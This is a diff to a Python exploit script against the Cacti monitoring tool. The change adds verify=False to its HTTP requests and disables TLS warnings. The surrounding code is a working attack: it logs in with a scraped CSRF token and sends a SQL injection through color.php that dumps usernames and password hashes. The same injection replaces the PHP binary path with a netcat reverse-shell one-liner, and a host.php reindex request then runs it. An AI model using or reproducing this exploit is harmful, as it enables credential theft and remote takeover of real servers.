@@ -22,13 +22,14 @@ def nccheck(url,username,password,lhost,lport):
             continue
 
 def sql_exploit(url,username,password,lhost,lport):
+    requests.packages.urllib3.disable_warnings()
     login_url = url + '/cacti/index.php'
 
     print("Getting the csrf token!")
     time.sleep(1)
 
     session = requests.Session()
-    csrf_url_req = session.get(login_url)
+    csrf_url_req = session.get(login_url,verify=False)
     
     csrf = re.findall("srfMagicToken = \"(.*);ip",csrf_url_req.text)
     
@@ -39,15 +40,15 @@ def sql_exploit(url,username,password,lhost,lport):
 
     print("Logging in")
     time.sleep(1)
-    login_req = session.post(login_url,data=data)
+    login_req = session.post(login_url,data=data,verify=False)
 
     print("Sending payload")
     time.sleep(1)
     sql_inj_url = url + "/cacti/color.php?action=export&header=false&filter=1%27)+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value=%27rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+"+lhost+"+"+lport+"+%3E/tmp/f;%27+where+name=%27path_php_binary%27;--+-"
-    sql_inj_req = session.get(sql_inj_url)
+    sql_inj_req = session.get(sql_inj_url,verify=False)
 
     payload_execute_url = url + "/cacti/host.php?action=reindex"
-    payload_execute_req = session.get(payload_execute_url)
+    payload_execute_req = session.get(payload_execute_url,verify=False)
 
 
 
